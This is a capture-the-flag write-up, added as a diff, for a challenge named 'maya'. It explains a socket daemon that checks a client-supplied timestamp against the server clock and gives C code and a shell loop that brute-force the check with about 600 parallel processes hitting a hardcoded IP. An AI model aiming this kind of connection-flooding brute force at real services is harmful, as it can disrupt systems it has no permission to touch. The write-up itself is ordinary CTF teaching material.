@@ -1,0 +1,74 @@
+The maya challenge is a simple socket daemon which accepts a tcp connection on
+port 1024. It then reads a string from the socket, turns this string into a
+long using atol, and calls the gettimeofday() api.
+
+From here on it compares the tv_sec value returned from the gettimeofday() api
+call divided by 10 against the long it got from the string that was read from
+the socket divided by 10 as well.
+
+In other words, we have to bruteforce the solution. The following ugly C code
+does this for us.
+
+    #include <sys/user.h>
+    #include <sys/time.h>
+    #include <sys/types.h>
+    #include <sys/socket.h>
+    #include <stdio.h>
+    #include <string.h>
+    #include <stdlib.h>
+    #include <arpa/inet.h>
+
+    int main(int argc, char *argv[])
+    {
+        struct timeval a;
+
+        if(fork() > 0) return 0;
+
+        int i = -3600 * 24 * 14 + 3600 * atol(argv[1]);
+        for (int j = -60 * 10; j < 60 * 10; j += 3) {
+
+            int s = socket(AF_INET, SOCK_STREAM, 0);
+            struct sockaddr_in addr;
+            addr.sin_family = AF_INET;
+            addr.sin_addr.s_addr = inet_addr("94.45.252.244");
+            addr.sin_port = htons(1024);
+            connect(s, (struct sockaddr *) &addr, sizeof(addr));
+
+            gettimeofday(&a, NULL);
+
+            char buf[64];
+            sprintf(buf, "%ld", a.tv_sec + i + j);
+
+            send(s, buf, strlen(buf), 0);
+
+            struct timeval val = {};
+            val.tv_usec = 200000;
+            setsockopt(s, IPPROTO_TCP, SO_RCVTIMEO, &val, sizeof(val));
+
+            memset(buf, 0, sizeof(buf));
+            if(recv(s, buf, sizeof(buf), 0) > 0) {
+                printf("%s\n", buf);
+                fflush(stdout);
+            }
+
+            close(s);
+        }
+    }
+
+We call it with the following commands.
+
+$ gcc a.c -std=c99
+$ for i in {0..600}; do ./a.out $i; done |tee a.txt
+
+The fork() is in order to run the applications in parallel, rather than
+sequential. So about 600 instances are ran, each of them tries the timeofday
+for a different hour within the past two weeks and the following week (because
+we don't know the exact time on the server, although we guessed that the
+challenge name maya might be a hint.)
+
+So each instance tries to bruteforce one hour. It does this by varying between
+the current time minus 10 minutes upto the current time plus 10 minutes.
+Furthermore not every second is tried, but one iteration skips three seconds
+(note that the server divides both timeofday and the input by ten in order to
+account for latency issues etc, and therefore we can skip three to five
+seconds per iteration.)
